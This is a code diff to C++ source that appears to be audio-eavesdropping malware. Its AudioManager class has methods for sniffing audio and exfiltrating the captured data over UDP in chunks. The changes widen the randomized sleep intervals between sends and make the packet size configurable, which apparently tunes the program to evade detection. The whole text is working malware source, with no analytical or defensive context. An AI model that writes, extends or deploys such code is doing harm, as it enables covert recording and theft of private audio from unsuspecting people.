@@ -8,11 +8,11 @@ void AudioManager::SetSleepMode(int modeInt) {
     float max = 10.0f;
 
     switch (modeInt) {
-        case 0: min = 5.0f;  max = 10.0f; break; 
-        case 1: min = 10.0f; max = 20.0f; break;
-        case 2: min = 20.0f; max = 40.0f; break; 
-        case 3: min = 40.0f; max = 80.0f; break;
-        case 4: min = 5.0f;  max = 300.0f; break;
+        case 0: min = 5.0f;  max = 20.0f; break; 
+        case 1: min = 10.0f; max = 40.0f; break;
+        case 2: min = 20.0f; max = 60.0f; break; 
+        case 3: min = 40.0f; max = 100.0f; break;
+        case 4: min = 15.0f;  max = 400.0f; break;
     }
     this->dist = std::uniform_real_distribution<float>{ min, max };
 }
@@ -267,14 +267,14 @@ void AudioManager::AudioSniffer() {
     }
 }
 
+void AudioManager::SetPacketSize(int size) {
+    packetSize = size;
+}
 
 void AudioManager::Exfiltrate() {
     using clock = std::chrono::steady_clock;
     auto nextFlush = clock::now();
     const auto flushEvery = std::chrono::seconds(5);
-
-    const size_t CHUNK_SIZE = 1440;
-
     while (bRunning) {
         RandomSleep();
 
@@ -304,7 +304,7 @@ void AudioManager::Exfiltrate() {
 
             while (offset < totalSize && bRunning) {
                 size_t remaining = totalSize - offset;
-                size_t toSend = (remaining > CHUNK_SIZE) ? CHUNK_SIZE : remaining;
+                size_t toSend = (remaining > packetSize) ? packetSize : remaining;
 
                 int result = sendto(udpSocket,
                     dataToProcess.data() + offset,
@@ -333,7 +333,7 @@ void AudioManager::Exfiltrate() {
             }
 
             std::cout << "[+] Exfiltrated " << totalSize / 1024 << " KB across "
-                << (totalSize / CHUNK_SIZE) + 1 << " packets.\n";
+                << (totalSize / packetSize) + 1 << " packets.\n";
         }
 
         nextFlush = clock::now() + flushEvery;
